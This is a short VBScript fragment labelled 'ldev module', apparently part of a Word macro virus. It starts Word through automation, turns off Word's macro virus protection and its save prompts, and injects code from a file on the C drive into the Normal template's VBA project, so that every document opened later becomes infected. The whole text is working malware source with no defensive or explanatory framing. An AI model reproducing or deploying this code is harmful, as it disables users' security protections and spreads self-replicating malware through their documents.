' ldev module
on error resume next
set w=createobject("word.application")
w.options.virusprotection=0
w.options.savenormalprompt=0
w.options.confirmconversions=0
w.normaltemplate.vbproject.vbcomponents.item(1).codemodule.addfromfile("c:\ldev.sys")
w.application.quit
wscript.quit
